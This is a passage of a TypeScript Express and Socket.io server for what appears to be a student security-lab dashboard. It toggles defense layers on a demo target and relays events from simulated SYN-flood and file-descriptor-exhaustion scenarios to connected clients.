      updateFdMetrics(osL7State.fd_metrics.open_fds, 1024);
    }
    io.emit('OS_L7_STATE_UPDATE', {
      os_l7_state: osL7State,
      metrics: socketMetrics,
    });
  }
}

function broadcastDefense() {
  const payload = {
    defense_l3_state: defense.state,
    defense_l1_network: defense.l1Network,
    defense_l2_os: defense.l2Os,
    defense_layers: defense.getLayersState(),
    current_state: defense.currentState,
    proxied_to_target: defense.state !== null,
    updated_at: new Date().toISOString(),
  };
  io.emit('DEFENSE_TOGGLED', payload);
  return payload;
}

// Changes made in ElectroShop/Swagger must reach already connected dashboards.
let defensePollBusy = false;
const defensePoll = setInterval(async () => {
  if (defensePollBusy) return;
  defensePollBusy = true;
  const previous = JSON.stringify(defense.currentState);
  try { await defense.read(); } catch { /* null state is broadcast below */ }
  finally {
    if (previous !== JSON.stringify(defense.currentState)) broadcastDefense();
    defensePollBusy = false;
  }
}, 1000);
defensePoll.unref();
server.on('close', () => clearInterval(defensePoll));

app.post('/api/defense/toggle', async (req: Request, res: Response) => {
  const { layer, enabled, flag } = req.body || {};
  if (layer !== undefined && !isDefenseLayerId(layer)) {
    res.status(400).json({
      success: false,
      message: 'layer must be one of: l1, l2, l3',
    });
    return;
  }
  if (enabled !== undefined && typeof enabled !== 'boolean') {
    res.status(400).json({ success: false, message: 'enabled must be boolean' });
    return;
  }
  if (flag !== undefined && !isDefenseSubFlag(flag)) {
    res.status(400).json({
      success: false,
      message: 'flag must be one of: anti_sqli, rate_limit, input_sanitization',
    });
    return;
  }

  // W5-T1: Bật/tắt độc lập Lớp Khiên Mạng (L1) hoặc Lớp Khiên Hệ điều hành (L2)
  if (layer === 'l1' || layer === 'l2') {
    const newLayerState = defense.setLayer(layer, enabled);
    applyLayerSideEffects(layer, newLayerState);
    broadcastDefense();
    const label = layer === 'l1' ? 'Khiên Mạng L1 (Static ARP & iptables)' : 'Khiên HĐH L2 (Syncookies, ulimit & nologin)';
    res.json({
      success: true,
      layer,
      defense_l1_network: defense.l1Network,
      defense_l2_os: defense.l2Os,
      defense_l3_app: defense.state,
      defense_layers: defense.getLayersState(),
      current_state: defense.currentState,
      proxied_to_target: defense.state !== null,
      message: `${label} hiện đang: ${newLayerState ? 'BẬT (SECURED)' : 'TẮT (VULNERABLE)'}`,
    });
    return;
  }

  try {
    await defense.change({ enabled, flag });
    broadcastDefense();
    res.json({
      success: true,
      layer: 'l3',
      defense_l1_network: defense.l1Network,
      defense_l2_os: defense.l2Os,
      defense_l3_app: defense.state,
      defense_layers: defense.getLayersState(),
      current_state: defense.currentState,
      proxied_to_target: true,
      message: `Khiên phòng thủ L3/L7 hiện đang: ${defense.state ? 'BẬT (SECURED)' : 'TẮT (VULNERABLE)'}`,
    });
  } catch {
    broadcastDefense();
    res.status(502).json({
      success: false,
      layer: 'l3',
      defense_l1_network: defense.l1Network,
      defense_l2_os: defense.l2Os,
      defense_l3_app: null,
      defense_layers: defense.getLayersState(),
      current_state: null,
      proxied_to_target: false,
      message: 'Không xác nhận được trạng thái từ Target. Hãy kiểm tra kết nối.',
    });
  }
});

app.get('/api/defense/status', async (_req: Request, res: Response) => {
  try {
    await defense.read();
    broadcastDefense();
    res.json({
      defense_l1_network: defense.l1Network,
      defense_l2_os: defense.l2Os,
      defense_l3_app: defense.state,
      defense_layers: defense.getLayersState(),
      current_state: defense.currentState,
      target_url: config.targetAppUrl,
      proxied_to_target: true,
    });
  } catch {
    broadcastDefense();
    res.status(502).json({
      defense_l1_network: defense.l1Network,
      defense_l2_os: defense.l2Os,
      defense_l3_app: null,
      defense_layers: defense.getLayersState(),
      current_state: null,
      proxied_to_target: false,
    });
  }
});

// Attack events are not HTTP logs. Preserve the worker evidence and run_id.
app.post('/api/events/attack', (req: Request, res: Response) => {
  const event = req.body;
  if (!validateAttack(event) || (event.event_type === 'WORKER_EVENT' && event.payload.run_id !== event.run_id)) {
    res.status(400).json({ success: false, message: 'Invalid attacker event v1' });
    return;
  }
  const existing = attackEvents.get(event.event_id);
  if (existing) {
    res.json({
      success: true,
      duplicate: true,
      event_id: event.event_id,
      status: 'PROCESSED_AND_BROADCASTED',
    });
    return;
  }
  attackEvents.set(event.event_id, event);
  if (attackEvents.size > config.maxBufferSize) attackEvents.delete(attackEvents.keys().next().value!);

  // Đồng bộ biểu đồ SYN_RECV khi nhận sự kiện kịch bản S2 (TCP SYN Flood) từ Attacker
  if (event.scenario === 'S2') {
    const p = event.payload as Record<string, unknown>;
    if (p.state === 'STARTING' || p.state === 'RUNNING' || p.type === 'progress') {
      socketMetrics.syn_recv = Math.min(250, Math.max(socketMetrics.syn_recv + 35, 95));
      recordSynHistory(socketMetrics.syn_recv);
      io.emit('NETWORK_STATE_UPDATE', { network_state: networkState, metrics: socketMetrics });
    }
  } else if (event.scenario === 'S3') {
    // Đồng bộ đồng hồ File Descriptors (lsof) khi nhận sự kiện kịch bản S3 (FD Exhaustion)
    const p = event.payload as Record<string, unknown>;
    const measurements = typeof p.measurements === 'object' && p.measurements !== null
      ? (p.measurements as Record<string, unknown>)
      : {};
    const resultObj = typeof p.result === 'object' && p.result !== null
      ? (p.result as Record<string, unknown>)
      : {};
    const resultMeasurements = typeof resultObj.measurements === 'object' && resultObj.measurements !== null
      ? (resultObj.measurements as Record<string, unknown>)
      : {};

    if (p.state === 'STARTING' || p.state === 'RUNNING' || p.type === 'progress' || p.state === 'COMPLETED') {
      const opened = typeof resultMeasurements.opened_fds === 'number'
        ? resultMeasurements.opened_fds
        : typeof measurements.requested_fds === 'number'
          ? measurements.requested_fds
          : typeof p.opened_count === 'number'
            ? p.opened_count
            : typeof p.max_fds === 'number'
              ? p.max_fds
              : 920;
      const limitVal = typeof resultMeasurements.soft_limit === 'number'
        ? resultMeasurements.soft_limit
        : typeof p.soft_limit === 'number'
          ? p.soft_limit
          : osL7State.fd_metrics.max_fds;
      const hitEmfile = Boolean(resultMeasurements.hit_emfile);
      const effectiveOpen = hitEmfile ? limitVal : Math.max(opened, Math.round(limitVal * 0.9));
      updateFdMetrics(effectiveOpen, limitVal, '/tmp/pbl4_fd_exhaust_*');
      io.emit('OS_L7_STATE_UPDATE', { os_l7_state: osL7State, metrics: socketMetrics });
    }
  }

  io.emit('ATTACK_EVENT', event);
  res.json({
    success: true,
    duplicate: false,
    event_id: event.event_id,
    status: 'PROCESSED_AND_BROADCASTED',
  });
});

app.get('/api/events/attack', (req: Request, res: Response) => {
  const events = [...attackEvents.values()].filter(event => !req.query.run_id || event.run_id === req.query.run_id);
  res.json({ count: events.length, capacity: config.maxBufferSize, events });
});

app.get('/api/config', (_req: Request, res: Response) => {
  res.json({ nodes: config.nodes, metrics_source: 'simulated' });
});

/**
 * GET /api/health
 */
app.get('/api/health', (req: Request, res: Response) => {
  res.status(200).json({
    status: 'ONLINE',
    service: 'God-View Ingestion & WebSocket Hub',
    port: config.port,
    buffer_items: telemetryBuffer.size(),
    capacity: telemetryBuffer.getCapacity(),
    connected_clients: io.engine.clientsCount,
    timestamp: new Date().toISOString(),
  });
});

// ==========================================
// SERVE STATIC FRONTEND (god-view/client/)
// ==========================================
app.use(express.static(config.clientDir));

// Fallback route cho Single Page Application
app.get('*', (req: Request, res: Response, next) => {
  if (req.path.startsWith('/api')) {
    return next();
  }
  res.sendFile(path.join(config.clientDir, 'index.html'));
});

// ==========================================
// SOCKET.IO EVENT HANDLERS
// ==========================================
io.on('connection', (socket) => {
  console.log(`[Socket.io] Client kết nối: ${socket.id}`);

  // Gửi trạng thái ban đầu và lịch sử log cho client mới kết nối
  socket.emit('INITIAL_STATE', {
    history: telemetryBuffer.getAll(),
    attack_events: [...attackEvents.values()],
    nodes: config.nodes,
    metrics: socketMetrics,
    network_state: networkState,
    os_l7_state: osL7State,
    defense_l3_state: defense.state,
    defense_l1_network: defense.l1Network,
    defense_l2_os: defense.l2Os,
    defense_layers: defense.getLayersState(),
    capacity: telemetryBuffer.getCapacity(),
  });

  // Đo RTT Latency: Client gửi ping_rtt kèm client_time, server phản hồi
  socket.on('ping_rtt', (data: { client_time: number }) => {
    socket.emit('pong_rtt', {
      client_time: data.client_time,
      server_time: Date.now(),
    });
  });

  // Client yêu cầu toggle khiên chắn trực tiếp từ socket (hỗ trợ cả 3 lớp L1, L2, L3)
  socket.on('TOGGLE_DEFENSE', async (data?: { layer?: string; flag?: string; enabled?: boolean }) => {
    const layer = data && isDefenseLayerId(data.layer) ? data.layer : 'l3';
    const enabled = data && typeof data.enabled === 'boolean' ? data.enabled : undefined;
    if (layer === 'l1' || layer === 'l2') {
      const active = defense.setLayer(layer, enabled);
      applyLayerSideEffects(layer, active);
      broadcastDefense();
      return;
    }
    try {
      const flag = data && isDefenseSubFlag(data.flag) ? data.flag : undefined;
      await defense.change({ flag, enabled });
      broadcastDefense();
    } catch {
      broadcastDefense();
      socket.emit('DEFENSE_ERROR', { message: 'Không xác nhận được trạng thái từ Target.' });
    }
  });

  void defense.read().then(broadcastDefense).catch(broadcastDefense);

  socket.on('disconnect', () => {
    console.log(`[Socket.io] Client ngắt kết nối: ${socket.id}`);
  });
});

// Khởi động HTTP & WebSocket server
server.listen(config.port, config.host, () => {
  console.log('====================================================');
  console.log(`[God-View Hub] Server đang chạy tại: http://${config.host}:${config.port}`);
  console.log(`[God-View Hub] Mở giao diện Dashboard tại: http://localhost:${config.port}`);
  console.log(`[God-View Hub] Target App URL: ${config.targetAppUrl}`);
  console.log(`[God-View Hub] Ring Buffer Capacity: ${config.maxBufferSize} bản tin`);
  console.log('====================================================');
});

export { app, server, io };
